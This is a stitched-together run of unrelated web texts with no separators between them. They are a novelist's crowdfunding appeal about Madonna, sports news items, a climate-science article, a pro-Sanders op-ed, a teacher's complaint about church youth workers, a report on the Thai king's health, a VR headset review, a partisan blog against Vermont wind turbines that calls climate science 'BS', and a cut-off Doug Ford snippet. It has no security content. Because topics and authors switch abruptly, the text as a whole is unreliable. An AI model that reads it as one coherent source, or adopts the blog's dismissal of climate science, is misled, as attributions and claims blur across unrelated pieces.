When I grew up in the 1980s, it wasn't a great time to be a child who was obviously gay. My hometown of Bolton was a tough working-class environment where if you didn't fit in and play football you were instantly singled out as ‘queer' or a ‘poof'. Like many gay men, I was persecuted relentlessly and there was little I could hold on to for support. Before the internet, there was little to give me hope that things would ever get better. Then along came Madonna. Here was a woman whose sexuality set her outside what society considered acceptable. Here was a woman with such grit and determination that she'd driven herself out of a background that had made her unhappy. Here was a woman who at the age of five had suffered the death of her mother – but one who projected a front of strength, strapping on her armour (or shield-like costumes) in order to survive. I was hooked.When Madonna began speaking in interviews about her gay friends and her gay brother, singing about gay culture in the song 'Vogue', and parading her troupe of gay dancers in the film In Bed With Madonna, I clung onto her even more tightly. There were so few gay men in the public eye in those days and so few straight allies to defend us. But none of that mattered anymore because Madonna was on our side. She became my goddess. I've thought about what Madonna meant to me a lot recently, as people have become much more aware about the emotional bond we can have with our divas. They've started talking much more openly about how we can elect an icon of popular culture as our spirit guide – whether it's Beyoncé or Taylor Swift or Lady Gaga. And this inspired me to write a novel loosely based on my own story, structuring each chapter around a well-known Madonna song.I've called it The Madonna of Bolton and I'm so happy with it – it's the one thing in life I'm most proud of. But when I submitted it to publishers, it was rejected by all of them. They told me it wasn't commercial enough because Madonna is a turn-off now that she's an old woman. And they said the book was too gay and no-one would want to read a story with a central character who isn't straight. I disagree with them on both points.So I went to Unbound, who are an award-winning publisher of lots of brilliant books that are sold in regular bookshops like any others. The big difference is that rather than paying its authors hefty advances, Unbound asks them to prove there's a market for their book by selling enough advance copies to cover the cost of publishing it. I'm working with Unbound because I want to prove traditional publishers wrong. I want to prove to them that there's no such thing as a book that's too gay – and Madonna's career isn't over.If you've ever felt emotionally supported by your diva, whoever that may be, I'd love you to get involved.

Thanks so much - and let's hope we can create a bestseller together!
St Kilda forward Josh Bruce is set to recommit to the club and sign a long-term deal in coming days, turning down significant offers from at least two other clubs.
The 23-year-old, who was originally drafted to Greater Western Sydney, is believed to be close to signing a four-year deal worth more than $2 million.

Fairfax Media understands Bruce received sizeable offers from Essendon and Fremantle, but has preferred to stay at the up-and-coming Saints.
The Saints now have a strong group of key position players for the future, with Bruce and Paddy McCartin viewed as 10-year players, and the suspended Jake Carlisle – who can play at either end of the ground – to return in November.
Climate change occurring 10 times faster than at any time in past 65 million years
The planet is undergoing one of the largest changes in climate since the dinosaurs went extinct. But what might be even more troubling for humans, plants and animals is the speed of the change. Stanford climate scientists warn that the likely rate of change over the next century will be at least 10 times quicker than any climate shift in the past 65 million years. If the trend continues at its current rapid pace, it will place significant stress on terrestrial ecosystems around the world, and many species will need to make behavioral, evolutionary or geographic adaptations to survive.
Although some of the changes the planet will experience in the next few decades are already "baked into the system," how different the climate looks at the end of the 21st century will depend largely on how humans respond.
The findings come from a review of climate research by Noah Diffenbaugh, an associate professor of environmental Earth system science, and Chris Field, a professor of biology and of environmental Earth system science and the director of the Department of Global Ecology at the Carnegie Institution. The work is part of a special report on climate change in the current issue of Science.
Diffenbaugh and Field, both senior fellows at the Stanford Woods Institute for the Environment, conducted the targeted but broad review of scientific literature on aspects of climate change that can affect ecosystems, and investigated how recent observations and projections for the next century compare to past events in Earth's history.
For instance, the planet experienced a 5 degree Celsius hike in temperature 20,000 years ago, as Earth emerged from the last ice age. This is a change comparable to the high-end of the projections for warming over the 20th and 21st centuries.
The geologic record shows that, 20,000 years ago, as the ice sheet that covered much of North America receded northward, plants and animals recolonized areas that had been under ice. As the climate continued to warm, those plants and animals moved northward, to cooler climes.
"We know from past changes that ecosystems have responded to a few degrees of global temperature change over thousands of years," said Diffenbaugh. "But the unprecedented trajectory that we're on now is forcing that change to occur over decades. That's orders of magnitude faster, and we're already seeing that some species are challenged by that rate of change."
Some of the strongest evidence for how the global climate system responds to high levels of carbon dioxide comes from paleoclimate studies. Fifty-five million years ago, carbon dioxide in the atmosphere was elevated to a level comparable to today. The Arctic Ocean did not have ice in the summer, and nearby land was warm enough to support alligators and palm trees.
"There are two key differences for ecosystems in the coming decades compared with the geologic past," Diffenbaugh said. "One is the rapid pace of modern climate change. The other is that today there are multiple human stressors that were not present 55 million years ago, such as urbanization and air and water pollution."
Record-setting heat
Diffenbaugh and Field also reviewed results from two-dozen climate models to describe possible climate outcomes from present day to the end of the century. In general, extreme weather events, such as heat waves and heavy rainfall, are expected to become more severe and more frequent.
For example, the researchers note that, with continued emissions of greenhouse gases at the high end of the scenarios, annual temperatures over North America, Europe and East Asia will increase 2-4 degrees C by 2046-2065. With that amount of warming, the hottest summer of the last 20 years is expected to occur every other year, or even more frequently.
By the end of the century, should the current emissions of greenhouse gases remain unchecked, temperatures over the northern hemisphere will tip 5-6 degrees C warmer than today's averages. In this case, the hottest summer of the last 20 years becomes the new annual norm.
"It's not easy to intuit the exact impact from annual temperatures warming by 6 C," Diffenbaugh said. "But this would present a novel climate for most land areas. Given the impacts those kinds of seasons currently have on terrestrial forests, agriculture and human health, we'll likely see substantial stress from severely hot conditions."
The scientists also projected the velocity of climate change, defined as the distance per year that species of plants and animals would need to migrate to live in annual temperatures similar to current conditions. Around the world, including much of the United States, species face needing to move toward the poles or higher in the mountains by at least one kilometer per year. Many parts of the world face much larger changes.
The human element
Some climate changes will be unavoidable, because humans have already emitted greenhouse gases into the atmosphere, and the atmosphere and oceans have already been heated.
"There is already some inertia in place," Diffenbaugh said. "If every new power plant or factory in the world produced zero emissions, we'd still see impact from the existing infrastructure, and from gases already released."
The more dramatic changes that could occur by the end of the century, however, are not written in stone. There are many human variables at play that could slow the pace and magnitude of change -- or accelerate it.
Consider the 2.5 billion people who lack access to modern energy resources. This energy poverty means they lack fundamental benefits for illumination, cooking and transportation, and they're more susceptible to extreme weather disasters. Increased energy access will improve their quality of life -- and in some cases their chances of survival -- but will increase global energy consumption and possibly hasten warming.
Diffenbaugh said that the range of climate projections offered in the report can inform decision-makers about the risks that different levels of climate change pose for ecosystems.
"There's no question that a climate in which every summer is hotter than the hottest of the last 20 years poses real risks for ecosystems across the globe," Diffenbaugh said. "However, there are opportunities to decrease those risks, while also ensuring access to the benefits of energy consumption."
Do I love Bernie Sanders for all of the wrong reasons? Do I love Bernie Sanders because he reminds me of my cranky grandfather from Brooklyn – minus the lying – and because he reminds me of one of my favorite comedians, Larry David? Yes. Do I stand beside him because he would be the first Jewish president? Partly, yes. His parents fled from Eastern Europe much like my own great grandparents. This heartfelt connection is grounded in similar sentiment to those women who support Hillary who are ready for a female president, politics and policy be damned, including my own mother. Do I love Bernie for some of the right reasons, too? I think so.
Trust is a complicated thing. It is fragile. It is personal. I consider myself an Independent and not a Democrat. I have never been involved in any political campaign and never thrown my full weight behind a candidate. That is, until now.
Bernie's passion and his genuine straightforward approach is unquestionable. He is standing up to the big banks on Wall Street in order to support middle class Americans. His unwavering stance against greed and corruption is not limited to Wall Street. He tells it like it is. Greedy lobbyists supporting any number of causes influence our political system.
And that's where his campaign finance overhaul comes in. As soon as campaigns are no longer beholden to the big pockets of big corporations, our politicians may be able to act on behalf of their constituents: the people, not the profits. The campaign finance principle holds true whether you are a Republican, Democrat, Independent, Man, Woman, Black, White, Jew, Muslim, Catholic, feelin' the Bern, making America great again, or supporting Hillary Clinton. Campaign finance reform is what will allow for ideas that are perceived to be radical long-shots in a gridlocked Congress to come to fruition. It is principle. It is fundamental. It must come first.
The Clinton campaign went on attack a couple of weeks ago, just as they started to grasp the gravity of Bernie Sanders as a threat to their plans for the White House. Regardless of whether he becomes president or not, his campaign has injected undeniable energy into the race and flooded the conversation with thought-provoking issues. Clinton's approach to these issues has been troubling. The most troubling approach to me has been on the subject of universal healthcare.
Universal Healthcare: Cohen vs. Clinton at the Club in Chicago
In 2008, it sounded as if Hillary supported an end goal of Universal Healthcare in America. She was appalled at the gall of the Obama campaign for knocking her stance.
Then here's Chelsea not only challenging Bernie's plan, but grossly mischaracterizing it.
According to politifact:
It's impossible to predict with certainty how Sanders' plan would play out in real life. But Clinton's statement makes it sound like Sanders' plan would leave many people uninsured, which is antithetical to the goal of Sanders' proposal: universal health care. We rate her claim Mostly False.
Bingo. And since when is Hillary using the former first daughter as an attack dog? I challenge Chelsea Clinton on the above discourse here at a Clinton campaign rally in Chicago.
And Chelsea nails the response! She begins by agreeing that it is really important to have a public discourse on policy so that we can reach a consensus within the democratic party and move forward, in direct contradiction with what Hillary said in 2008. She goes on to say: “if you had asked me” – with her own emphasis on “me” – rather than asking Hillary, “I think it's very important that we have different policy discussions.” Time and time again, I notice that supporters in the Hillary camp, from her own daughter outwards, don't totally agree with what she has to say. And isn't it difficult to agree with her, when her stances are so often swayed by the political tide of the day?
Okay, Chelsea, let's actually have that policy discussion.
Bernie Sanders stands for Universal Healthcare of the single payer variety. While the plan has yet to be completely fleshed out, this means that Medicare would cover all American citizens with some basic level of coverage rather than only covering the elderly. This is ambitious, yes, but moving towards a simplification of our convoluted system is imperative. As it stands today, Medicare and CMS are the only ones publishing unbiased prices for services based on what they are actually estimated to cost. Without a doubt, we must move in this direction or something similar if we want to reach an end goal of Universal Healthcare for all Americans.
More than anything, we must move forward. Hillary Clinton seems content with the status quo that leaves millions uninsured and even more millions underinsured, while private insurers profit on ballooning prices that the layman (and even experts) can hardly understand. The Commonwealth Fund, an independent scholarly organization, estimates that over $500 billion per year could be saved by investing in a single payer system in the US. Over $500 BILLION. Of course, it would take political buy-in and an initial investment from the federal government. Those details need to be fleshed out, and Bernie's current plan does not sufficiently flesh them out, nor does it need to at this juncture. Just ask policy wonk and former Clinton Secretary of Labor Robert Reich. But for the Hillary Clinton campaign to disregard an opportunity of this magnitude, to improve the health of our nation and to save such large sums of cash is preposterous.
I can sense uneasiness among readers who wonder how on Earth we might gain political buy-in for such radical change. Proponents of the single payer were shut down during initial ACA talks. Firstly, we must allow the voice of the people to be heard. It starts with campaign finance reform to allow candidates representing the people to once again take seats on Capitol Hill. On that note, our female politicians could really teach their male counterparts a lesson in responsibility. They are an inspiration. Progressive minds, regardless of their political stance for a candidate, must do their homework and make it known that the single payer system is the end goal. Right now, a certain candidate is doing the nation a disservice in the name of pragmatism that may more accurately be deemed cowardice.
If you really want to dive into healthcare and educate yourself on the problem, refer to this excellent 2013 article in Time Magazine.
“Taken as a whole, these powerful institutions and the bills they churn out dominate the nation's economy and put demands on taxpayers to a degree unequaled anywhere else on earth. In the U.S., people spend almost 20% of the gross domestic product on health care, compared with about half that in most developed countries. Yet in every measurable way, the results our health care system produces are no better and often worse than the outcomes in those countries.”
I have worked with hospitals on making the cost of care, specifically the out-of-pocket cost for patients, become more transparent. Check out this article I wrote back in 2014 to help explain healthcare costs and pricing (spoiler alert: nobody knows what healthcare costs because our system is overly complicated and in dire need of simplification). I helped design this Price Transparency website at the University of Michigan Health System. Trust me, it was a challenge. Not even the most financially responsible hospital in the nation can tell you the cost for all of their services. They are reimbursed at different rates across all insurers (payers like Blue Cross Blue Shield, Aetna, United, etc.) and prices for the same service or drug fluctuates tremendously from hospital to hospital. It is hardly based in any logic whatsoever. Instead, it is based on profit-driven greed by the private insurance companies and often times by for-profit hospitals. The only consistency when it comes to price is that uninsured patients end up paying more – far more, sometimes 100% more – than insurance companies do.
And while the Affordable Care Act has made tremendous strides in providing universal healthcare, we're not quite there. According to the Kaiser Commission on Medicaid and the Uninsured, over 32 million people remained uninsured in 2014 after the ACA registrations. That doesn't even touch on the many more millions of underinsured Americans who are forced to meet high deductibles that they can't afford to pay.
Again, the ACA made great strides. It expanded Medicaid, provided the marketplace plans, regulated what uninsured patients may be charged and ended pre-existing conditions loopholes for insurers. But now is no time to rest on our laurels. The writers of the ACA – Bernie Sanders among them – were forced to make concessions due to gridlocked politics. We have a long way to go to see that all Americans are not only covered, but covered completely. In order to get there, we need a gross simplification of the system. Medicare and CMS are the only trustworthy sources we have for estimating costs and keeping patients from being charged out the wazoo. While a single payer plan is ambitious, it has to be considered as an optimal end goal.
An Evolution of the Candidates – Bernie and Hillary Over the Years
Many among us doubt Bernie's foreign policy prowess when compared to Hillary Clinton's experience as Secretary of State. I think that Hillary has done an admirable job as Secretary of State and me, too, have doubted Bernie's capabilities in this area. Remember, however, that prior to Clinton becoming Secretary of State in 2009, she, too, was green to foreign policy having only been a senator. The same could be said for Obama and countless other presidents. When it comes to the presidency and the role of Commander in Chief, judgment is at least equally important as experience. Bernie was vehemently opposed to the 2003 War in Iraq and outlined a litany of considerations that ultimately and unfortunately turned out to be true. Hillary Clinton, on the other hand, supported the war.
Kudos to Clinton for acknowledging her mistake in Iraq, but we can't afford that lapse in judgment from our Commander in Chief. While I have the utmost respect for Hillary Clinton as a stateswoman, I'll take judgment over experience in the White House. I trust that Bernie Sanders will surround himself by plenty of seasoned and experienced statesmen in his cabinet.
The Clinton campaign also launched an attack on Bernie's gun record. Sanders is strong on gun control. He once lost an election for his stance on banning assault weapons in the state of Vermont. Hillary claims that he has “flip flopped” on a vote he cast that prevented gun manufacturers from being prosecuted if someone buys a gun legally and then breaks the law. There is nuance to the bill, and he now supports a revised version of it. He holds a D-minus voting record from the NRA. What is most important, and what he supports completely, does that guns do not get in the hands of criminals and that mental health issues are treated promptly. If proper background checks are implemented, then suing gun manufacturers is irrelevant.
I'm not naive enough to believe that a presidential candidate, as any human being, may not evolve intellectually as they continue to learn and grow. I would like to give Hillary Clinton the benefit of the doubt in some cases, as I would for Bernie on the gun legislation. When it comes to this evolution, however, it is apparent to me that one candidate changes course when it is politically advantageous to do so. That was the case for Hillary on gay marriage, Universal Healthcare, and the Iraq War decision.
Nor am I naive enough to believe that any great change or revolution will happen overnight. Sanders supporters are not stupid or unrealistic. Quite the opposite. Let's keep the forward momentum and see how far this ball can roll, because taking a chance beats the status quo.
For those among us, including my aforementioned mother, who would like to see a woman in the White House, consider that fellow crusader Elizabeth Warren is a likely running mate of Bernie's. Imagine her heading her own ticket for the presidency in four or eight years. Let's get the right woman in the White House, not just any woman. Read her Op Ed here on the impact of enforcing the law through presidential appointments. Do we really trust a candidate who made over $600,000 in Goldman Sachs speaking fees and these ties to Wall Street to enforce the law against white collar criminals?
So far, this revolution has not been televised. Maybe CNN should apologize and explain why the media has missed Bernie. I understand the conventional wisdom: Hillary Clinton was supposed to be the inevitable Democratic candidate.
UPDATE:
Paul Simon, My Parents, Bernie Sanders, and America
I remember my mother telling me the story of Paul Simon at the age of 17 coming in to play for her elementary school classroom in Queens, New York. He wasn't famous yet, and his mother was my mother's teacher. I remember my father telling me the story of how he got tickets for Paul Simon in Central Park in 1974 and how he took a date to hear Simon play. And I remember riding along in the passenger side of my father's car en route to the Outer Banks for a beach trip. It was that 1994 Honda Passport that I would inherit as my first car, that I would whip around the streets of Alexandria making trouble. But long before I had my driver's license, I was my father's travel companion, the nine-year-old child of his first marriage. We were beached bound to the Outer Banks, North Carolina. Paul Simon's Graceland was in the tape player, our heads bouncing and bobbing along to that deep and infectious African bass line that permeates the album and simultaneously my heart by way of my ears. We weren't going to Graceland of course, we were going to the Outer Banks, but we did have reason to believe that we would be received when we got there.
We all have reason to believe that America will be well received in the competent hands of Bernie Sanders. Consider this ad to be among the wrong reasons to vote for Bernie.
I took four months to travel the world and returned reinvigorated with pride in my country. I trust that Americans will get this one right. From Costa Rica to Japan and everywhere in between, I came across the same question: was Donald Trump for real? No, I assured them. Now I'm not so certain. In national polls, Sanders beats Trump by higher margins than does Hillary. Frighteningly, Hillary loses to Cruz where Bernie beats him out by four points.
I'm feelin' the Bern. I will not apologize. This is a once in a lifetime progressive revolutionary American presidential candidate. I will not apologize. In the words of Black Thought, “yo, a revolution's what it's smelling like, it ain't going to be televised.” I will not apologize, and neither will Bernie.

I always kind of like looking at poll questions answered a sample of NFL players. Sports Illustrated does one each week (unless they stripped that too), the league conducts one occasionally, and this week, Sporting News had its network of correspondents asks 111 NFL players the following question: 'Which coach (other than your own) would you most like to play for?'
The top two receiving votes were...
Rex Ryan, New York Jets -- 22
Mike Tomlin, Pittsburgh Steelers - 22
The next place finisher, Bill Belichik, wasn't even close with 11 votes. Some might be surprised to see Ryan fare so well in the poll, but they shouldn't be. Ryan is the ultimate player's coach, and though it might be annoying at times to hear him talk so grandiosely about his team, you better believe that players like that kind of bravado and confidence.
As for Tomlin, well, when you're a cool customer who's taken two teams to the Super Bowl before the age of 40, you're probably going to have guys want to come play for you. Guys around the league talk and there's no question that Steelers players speak favorably of their head coach. Tomlin does have a thing or two to prove to Steeler Nation though in upcoming weeks after his self-proclaimed mistakes didn't help Pittsburgh's chances down the stretch last Sunday night against Baltimore.
As for other notes about the list, I found it interesting that Mike Shanahan was nowhere to be found despite having coached plenty of guys still in the league. No Andy Reid sighting either (I think he just looks to gross and scary for most, but then again, how do you explain Rex Ryan?); and finally, despite having coached a grand total of 8 games, Jim Harbaugh comes in fourth place in the poll.
Tomlin and the Steelers return to action this coming Sunday in Cincinnati.
Religious representatives masquerading as youth workers are enjoying unsupervised access to students in certain state schools without the knowledge of some parents, writes Chris Fotinopoulos, a state schoolteacher and Melbourne writer.
As debate over religious education and chaplaincy programs in state schools attract public attention, religious representatives masquerading as youth workers are enjoying unsupervised access to students in certain Melbourne state schools without the knowledge of many parents and teaching staff. Most of us are accustomed to proselytisers lurking in public spaces or appearing unannounced on our doorstep in the hope of snagging dispirited souls. And we put up with them only because we can walk away or slam the door shut. Our tolerance, however, ought to end at the public school gate, particularly when church groups use sweets and saccharine smiles to lure 13-year-olds into classrooms that are out of earshot of teaching staff, as has been the case for several years at the state school I teach at. Keen to obtain a clearer understanding of this church-based program, I decided to plant myself in an adjacent classroom and eavesdrop on their so-called "student focussed lunchtime activity". As with most sermons, this lunchtime sessions begin with the church leader posing life's big questions. "Who likes chocolate?" "Me." The kids are encouraged to yell at the top of their lungs, with the child who manages the loudest screech receiving a chocolate reward. Watching the group leader in action reminded me of dog trainers in charge of frisky pups on their first day of training school. But in this case, it is religious interlopers posing as youth workers who command the attention of children. As the ecstatic laughter and screams reach a crescendo, the group leader asks: "Who are we?" "You're Baptist!" "Here's a Freddo for you." "Where are we from?" "The Baptist Church from down the road!" "A Cherry Ripe for you." "Who do we represent?" "Jesus!" "Mars Bar." "Who can remember the golden rule from last week?" "Treat others as you want to be treated." "That certainly deserves a Freddo!" The golden rule or ethic of reciprocity prescribes behavioural consistency, which essentially requires our actions to be in harmony with our desires. We often ask youngsters "how you would like it if it was done to you?" as a way of prompting them to see things from the point of view of others. It is essentially a lesson in empathy and solidarity. So allow me to pose a similar question to our religious interlopers. How would you like it if your child were enticed with chocolates to embrace a belief system that you did not subscribe to? I was informed by a school administrator that parents are provided with a notice at the beginning of the school year offering them the choice to opt their child out of the "youth program". But even if this is the case, at no stage did I see the group leader ask for a permission slip or a consent form. I even asked a couple of my year 8 boys who had never attended these sessions to see if they could participate without a signed parental consent form. Unsurprisingly, they were not only welcomed with high-fives and exaggerated smiles, the organisers made out as if they knew them, greeting them with "hi, long time no see" and "do you like chocolate?" What's more, I am required to seek parental consent for screening films or presenting literature and ideas that may be considered insensitive to certain religious groups and traditions, yet God's representatives see no need to adhere to this arrangement. As the chocolates continued to flow throughout lunchtime, the organisers invited a young woman to relate her personal story. Her story is essentially as follows: "I used to party a lot, drink alcohol and stay out late. One morning I woke up to Jesus. He asked me what I was doing with my life. He told me not to go to university, and to become involved in the program. I am now free of my past through Jesus. I now turn to Jesus with my problems and he guides me." So the implication here is that choices made without Jesus' help are not wise choices. Urging students to act in accordance with Divine orders contradicts the notion of a successful learner, which according to The Melbourne Declaration on Educational Goals for Young Australians is to "think deeply and logically, obtaining and evaluating evidence in a disciplined way". The group's audacious foray into my school had me wondering if similar programs operate in states school throughout Victoria and indeed the nation. I contacted the Australian Baptist Ministries asking for information on this matter. Given the clandestine nature of the program in my school, I was unsurprised by the Church's mute response to this request. I did, however, visit the various official Baptist websites, particularly the youth-orientated ones, to obtain a clearer understanding of the Church's youth agenda. Based on the Baptist Youth Ministries website (BYM, which is a network of leaders and youth communities from NSW and ACT) "… the primary role of Baptist Youth is to help children and young adults develop a global vision and know God's heart for the nations and to give them an opportunity to play their part in bringing the good news of Jesus to the ends of the earth." Given the evangelical tone of this mission statement, along with my observations at my school, I would not be surprised if schools throughout Australia had been targeted for this purpose. Parents who are opposed to such clandestine faith-based initiatives in state schools should contact their local state school and ask if similar initiatives operate under the guise of "youth support". I don't think they'd be too pleased to discover that religious groups are luring their children into classrooms with sweets and confected joy for proselytising purposes. *Chris Fotinopoulos is a state schoolteacher and a Melbourne-based writer.

The ailing King Bhumibol Adulyadej has undergone haemodialysis, the palace said, sending the local stock market plunging
Thailand's 88-year-old King Bhumibol Adulyadej, the world's longest reigning monarch, is in an unstable condition after receiving haemodialysis treatment, a palace statement has said.
News about the king's health is closely monitored in Thailand, where King Bhumibol is widely revered, and the wording of palace statements on his health is intensely scrutinised.
Strict laws protecting the royal family stifles any public discussion of the king's health.
The crime family at the centre of Asia's animal trafficking network Read more
It is unusual for the palace to state that the king's health is not stable. Statements on his health are usually issued after the monarch's condition shows improvement or when he is recovering from an illness.
Thailand's main stock index tumbled as much as 3.6% on Monday and the local baht currency fell to more than two-month lows.
The king has been treated for various ailments over the past year at Bangkok's Siriraj Hospital – his home for much of the past year – and was last seen in public on 11 January, when he spent several hours visiting his palace in the Thai capital.
Anxiety over the king's health and an eventual succession has formed the backdrop to more than a decade of bitter political divide in Thailand that has included two military coups and often-violent street demonstrations.
Sunday's statement was the second health bulletin this month after the palace said on 1 October that the king was recovering after a respiratory infection.
On Saturday, the king was given haemodialysis – a way of cleansing the blood of toxins, extra salts and fluids – which made his blood pressure drop occasionally, the palace said.
Doctors gave him some medicine and put him on a ventilator to bring his blood pressure back to normal, it said.
They continue to monitor his condition closely, the statement said.
“His condition has yet to stabilise,” the palace said.
In 2011, Princess Chulabhorn, the king's youngest daughter, said in a rare televised statement that the king had suffered a health scare and fell unconscious after suffering from internal bleeding likely induced by stress as a result of a flood crisis at the time.
Laws protecting the royals from insult make it a crime to defame, insult or threaten the king, queen, heir to the throne or regent.
Art Briles wasn't afraid to make a guarantee at Big 12 Media Days on Tuesday.
The Baylor head coach told the media that, if his team finishes the season with a perfect 12-0 record, the Bears will be headed to the playoffs.
"You can put that in ink," Briles told reporters at Omni Dallas Hotel.
But that may be a tricky thing to accomplish, with Baylor and co-conference champion TCU having been snubbed by the College Football Playoff committee last season in favor of teams crowned champions in their respective conferences.
Big 12 commissioner Bob Bowlsby said Monday that the league will stick to its round-robin style of play, with no plans at this time to expand to the 12 members it would need to host a championship game.
But Baylor is hoping to impress the CFP committee based on its body of work, and Briles predicts his "fearless" offense, led by son Kendal, will state a case for the playoffs.
Anything to be unpredictable, stressed Briles, in order to catch both his opponents and the committee off-guard.
"You don't want to stay the same," Briles said. "When you stay the same, people catch you, and you get caught. That's why criminals get caught. Because they do the same thing over and over again. You track them. If you hunt, you know this deer comes here every day, fish are in the fishing hole. You've got to be different. It gives us a chance to be a little different, and that's exciting to me. It's very exciting."
One thing that has stayed the same about Briles is his penchant for taking shots at TCU.
A media preseason poll picked TCU to win the Big 12 with 408 votes. Baylor came second at 384.
This didn't escape Briles, who led his team to the conference in 2013 and to a share of the title with the Horned Frogs in 2014, despite beating them head-to-head during the season.
"Guess we're going to have to win three times in a row to get picked first," Briles said.
Before attending Gamescom 2014, I was a VR sceptic. My previous experiences with virtual reality only extended as far Lawnmower Man-esque arcade games from the 90's, which were ludicrously expensive to play (£5 a go at the local arcade) and less than impressive. The controls felt clunky, the graphics sub-standard compared to the other games in the arcade and they were not very immersive experiences. Each time I read “VR is the future of gaming” I jokingly scoffed at the prospect – that was until I got my hands (and head) on 3 Project Morpheus demonstrations at Gamescom 2014 and now I am a converted VR optimist. Here are my thoughts on what I got to play.
The Set
The first thing I noticed when picking up the Project Morpheus headset was the weight. The headset is surprisingly light – lighter than it looks. It still has some weight in it but considering that the set contains screens, headphones, cables and straps to keep it in place, it felt sturdy but light.
Putting it on to my head, I was impressed with how well the Project Morpheus headset is balanced. I expected the screens to weigh down the front and for it to be putting pressure on the bridge of my nose but the back strap holds the headset firmly in place. The set didn't move too much as I wobbled my head and the screen always remained in view.
The one tiny irritation was the wiring. For something which is meant to be totally immersive, the wires felt a little out of place. As you play, you can often feel them touch your shoulder and it breaks the feeling of being totally “in” the game.
Overall, the headset felt… expensive.
Eve: Valkyrie
Eve: Valkyrie was the first Project Morpheus demo that I managed to get my heads-on and it was by far the best game I got to trial. Sitting down and sliding on the headset I was greeted by a gloriously detailed cockpit sitting in a tunnel. The attention to detail really shines through on the Project Morpheus' 1080p screen and the movement tracking means you get to look around all of the buttons and levers.
Hitting the acceleration, you blast along the tunnel at an astonishing speed, lights whizzing by – none of which caused any screen ripping, frame slow down or juddering, even though the screen is only centimetres away from your face.
Once you blast out of the tunnel, you can control the ship around a vast and beautiful battlefield using the Dualshock 4. At first, the divorce between the controller and the headset – controlling your view with your head instead of the thumb sticks – was a little disorientating and I found my head dropping involuntarily, making me look at my feet rather than the enemy ships. After a few minutes I have managed to get the hang of keeping my head up to realise how good Eve: Valkyrie really is. Swinging my fighter around to train my cross-hairs on an enemy, the red reticule highlighted then as they rounded to face me and I unleashed hell on them with everything I had. Missiles. Lasers. Every button I could mash. The following explosion was as satisfying as it was impressive. Flying through the missile smoke trails, I picked up another boggie and proceeded to blow the ass off of them too. A few minuets later and I was convinced I was now Star Fox meets Buck Rodgers and nothing could touch me – until I smashed into a floating structure and blew myself up that is. Dope.
Eve: Valkyrie will be a system seller for Project Morpheus. There didn't appear to be much depth to the game but the thought of getting this game for multiplayer and having massive Strike Suit Zero-esque battles with friends is certainly enough to whet the appetite for VR.
Morpheus Castle Demo
Those PS Move controllers might just have a late come back in them based on my experience with Morpheus Castle. This short demo has you play as a knight in training as they beat down a dummy using 2 PSMove controllers which respond to your hand movements. Pulling the PS Move triggers grasp what ever in reach. First the game presents a dummy and a weapon rack with a sword in it. Holding your hand out in the general direction and grasping picked up the sword and then you could slice and dice the dummy however you see fit. Next you are given a crossbow. Pulling the trigger lets loose a bolt. Lastly, a dragon eats you. I wasn't sure if there was anything I could have done to prevent getting eaten by the big lizard but it happened nonetheless.
Project Morpheus Castle is an excellent example of how the PS Move controllers can be used to present your own hand movements in VR. The interactions were very simplistic and no real accuracy was needed to pick up the sword but as a concept demo, it worked perfectly.
The major disappointment of this demo was the graphics. I asked whether this game would actually be releasing for Project Morpheus and was told that no decision had been made but if it is to see the light of day, some serious work will need to go into making the game look presentable. The graphics are simplistic, blocky and thoroughly undermining after playing Eve: Valkyrie.
The Deep
Just before stepping up to play The Deep I was informed that the version I was about to play was a new build and the improvements were obvious immediately compared to the direct feed I had seen of the E3 demo. The detail and lighting were impressive right from the off as I descended in my cage into the deep-sea, ready to face off against my toothy Selachimorpha hunters.
The Deep is an excellent example of how Project Morpheus and VR in general can enhance experiences past what is possible on a TV and couch. The demo is scary – next level terrifying – extremely immersive and uses all of the survival horror tricks, especially when it comes to the sound, to brown your undergarments. Much like Dead Space, you can hear danger closing – water swoosh around you – but when you look, you only catch a glimpse of a shark. Other times, Sharks appear out of no where and are biting the side of your cage – real jump out of your skin moments.
The Verdict
Having not played around with an Oculus Rift, I cannot compare Project Morpheus to its competitor but what I can say is that, with a few tweaks in ergonomic design and some similar but improved support in terms of games, I will most definitely be queuing up to hand over cash on day 1.
Project Morpheus proved to me that VR has come a long way since my arcade days and that the supporting technology has now caught up enough to make this a viable and exciting experience. It is immersive, responsive and beyond my expectations in terms of graphics. I honestly thought, before trying out Project Morpheus, that I would be happy enough to pass over Sony's VR offering but now, I know I had better start saving because VR really is the future of gaming.

The online Vermont news site Vermont Digger here presents a commentary by Vermont state Senator John Rodgers who represents my childhood home county of Orleans, and Essex county as well.
Photo: Industrializing Vermont's idyllic landscape. Cropped from video by Green Mountain Power Corp.
Senator Rodgers has had it with industrial wind energy ruining his state's environment, announcing:
I will join with the growing number of Vermonters who have concluded that industrial wind turbines do not belong in Vermont, period.”
As a consequence, in 2016 Rodgers plans to introduce a bill that would ban industrial wind turbines, sending them the way of the billboard. Rodgers position illustrates the rapidly growing resistance to industrial wind parks erected on Vermont's idyllic Green Mountains.
“Devastating” impact
Recently nearby wind-parks in Sheffield and Lowell have driven the message home to local residents and tourists that the green energies aren't green at all and that they are coming with a unexpectedly high environmental price. Rodgers, in his piece, calls the environmental impacts of wind turbines “devastating”.
Corrupt legislators, campaign finances for environmental ruin
Moreover Rodgers, a Democrat no less, accuses the Vermont legislature of political corruption:
We have legislators who write policy to serve the very utilities and energy developers that finance their campaigns.”
He also blasts industrial solar fields in Vermont, another state where the sun doesn't shine at night and one which often sees snow 6 months a year. He supports restrictions on large-scale solar installations, which he says benefits no one except solar industry profiteers. He writes that covering farmland and forests with solar panels reduces the amount of land available to grow food.
No affect on climate
The Vermont state senator writes that even the Public Service Department acknowledges that Vermont green energy policies will have no affect climate change, yet that they severely damage the local environment. He calls on protecting the state's forests and not industrializing them.
Vermont's power is already carbon neutral – why ruin the landscape for nothing?
It should be noted that some 150 years ago Vermont was mostly deforested due to its early sheep farming.
Moreover some 90% of the state's electric power has come from carbon neutral sources already!, such as Vermont Yankee nuclear power plant and hydroelectric power from Quebec. Vermont has far fewer than a million inhabitants and there is no sense whatsoever in ruining its landscape for something that will have absolutely zero impact whatsoever on the climate. It all boils down to green ideological showboating – one that comes with a terrible environmental heritage price.
Hopefully, more political leaders will follow Rodgers's lead and think seriously about what they are wreaking upon the state's beauty. As it stands, too many politicians have been governing under the influence of “green” dope and climate science BS. Unfortunately it looks like it's going to take a massive environmental hangover before they sober up from all the climate insanity.

Doug Ford says Walmart is his favourite place to shop.
The mayoral hopeful gushed over the discount retailer Sunday morning, saying that a campaign stop at Walmart's Dufferin Mall location left him in great spirits.
